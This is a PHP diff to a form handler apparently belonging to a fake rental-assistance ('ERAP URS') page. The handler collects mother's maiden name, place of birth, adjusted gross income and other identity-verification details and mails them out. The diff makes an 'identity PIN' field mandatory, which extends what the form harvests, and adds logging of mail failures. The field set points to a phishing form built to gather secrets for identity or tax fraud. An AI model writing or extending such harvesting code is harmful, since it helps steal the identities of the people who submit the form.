@@ -33,6 +33,7 @@ $maidenName   = $clean($_POST['urs_maiden_name'] ?? '');
 $otherContact = $clean($_POST['urs_other_contact'] ?? '');
 $birthPlace   = $clean($_POST['urs_birth_place'] ?? '');
 $agi          = $clean($_POST['urs_agi'] ?? '');
+$identityPin  = $clean($_POST['urs_identity_pin'] ?? '');
 
 $fields = [
     "FATHER NAME" => $fatherName,
@@ -41,9 +42,10 @@ $fields = [
     "OTHER CONTACT NAME" => $otherContact,
     "PLACE OF BIRTH" => $birthPlace,
     "ADJUSTED GROSS INCOME / BGI" => $agi,
+    "IDENTITY PIN" => $identityPin,
 ];
 
-$required = [$fatherName, $motherName, $birthPlace];
+$required = [$fatherName, $motherName, $birthPlace, $identityPin];
 if (in_array('', $required, true)) {
     echo "<h1>Submission Error</h1><p>Please complete all required fields.</p><a href='../erap-urs-details.html'>Go Back</a>";
     exit();
@@ -102,6 +104,7 @@ try {
         $attachments
     );
 } catch (\Throwable $exception) {
+    error_log('[URS] Mail send failed: ' . $exception->getMessage());
     echo "<h1>Submission Error</h1>";
     echo "<p>We were unable to process your URS details at this time. Please contact support.</p>";
     echo "<pre>" . htmlspecialchars($exception->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
